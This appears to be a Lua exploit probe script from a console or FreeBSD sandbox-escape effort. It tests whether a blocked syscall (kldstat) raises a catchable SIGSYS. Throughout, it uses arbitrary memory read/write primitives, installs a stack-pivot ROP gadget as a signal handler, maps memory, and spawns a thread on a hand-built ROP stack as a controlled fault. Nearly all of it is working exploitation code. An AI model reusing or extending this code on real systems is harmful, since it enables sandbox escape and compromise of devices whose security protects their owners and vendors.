-- CRASH_CLASS: HIGH
-- PROBE 1011a: is the "lethal" syscall kill a catchable SIGSYS?
--
-- 1009a claimed survival, but its call sites referenced an undefined helper, so the
-- syscalls were never entered. This version defines the helper, proves the pivot handler
-- still fires with a deliberate fault (control), then calls 306 kldstat.

print("=== PROBE 1011a: SIGSYS, REAL ===")
print("")
local function to_num(v)
    if type(v)=="table" and v.tonumber then return v:tonumber() end
    if type(v)=="table" and v.h then return v.h*4294967296+v.l end
    return tonumber(v) or 0
end
local function as_addr(x)
    local s = tostring(x)
    local m = s:match("0x(%x+)")
    if m then return tonumber(m,16) end
    return to_num(x)
end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function rq(a) local o,v=pcall(function() return memory.read_qword(uint64(a)) end) if o then return tostring(v) end return "?" end
local function wq(a,v) pcall(function() memory.write_qword(uint64(a),uint64(v)) end) end

print(string.format("[0] pid=%u fd=%s", to_num(mk(20)()), rq(signal.fd_addr)))
local ph = gadgets.stack_pivot[1]
local GA = to_num(ph.gadget_addr)
local sa = memory.alloc(0x28)
wq(as_addr(sa), GA); wq(as_addr(sa)+0x20, 0x4)
local ok, rv = pcall(function() return syscall.sigaction(12, sa, 0) end)
print(string.format("[1] handler=0x%X sigaction(12) rv=%s", GA, ok and tostring(to_num(rv)) or "ERR"))

-- control: a deliberate fault must still produce a report through the same handler
local page = 0x4000
local _, mp = pcall(function() return mk(477)(uint64(0),uint64(page),uint64(3),uint64(0x1002),uint64(0xFFFFFFFF),uint64(0)) end)
local mem = to_num(mp)
for o=0,page-8,8 do wq(mem+o,0) end
local stack = mem + 0x2000
wq(stack, 0)            -- pop rax operand: 0
wq(stack+8, to_num(gadgets["mov rax, [rax]; ret"]))  -- fault on 0
local ctx = memory.alloc(0x500); local ca = as_addr(ctx)
local tb = memory.alloc(8); local ta = as_addr(tb)
for o=0,0x4F8,8 do wq(ca+o,0) end
wq(ca+0x108,0x480); wq(ca+0x110,0x10000); wq(ca+0x0C0,0x43); wq(ca+0x100,0x3B)
wq(ca+0x0E0, to_num(gadgets["pop rax; ret"])); wq(ca+0x0F8, stack)
print(string.format("[2] control spawn at 0x%X rsp=0x%X", to_num(gadgets["pop rax; ret"]), stack))
local okc, crv = pcall(function() return mk(430)(uint64(ca),uint64(ta),uint64(0)) end)
print(string.format("[2] spawn ok=%s rv=%s", tostring(okc), okc and tostring(to_num(crv)) or ""))

local buf = memory.alloc(0x400); local ba = as_addr(buf)
for o=0,0x3F8,8 do wq(ba+o,0) end
print("[3] calling 306 kldstat")
local ok3, e3 = pcall(function() return mk(306)(uint64(ba), uint64(0x400), uint64(0), uint64(0), uint64(0), uint64(0)) end)
print(string.format("[3] ok=%s rv=%s", tostring(ok3), ok3 and tostring(to_num(e3)) or ""))
print(string.format("[3] alive pid=%u buf0=%s", to_num(mk(20)()), rq(buf)))
print("=== COMPLETE ===")
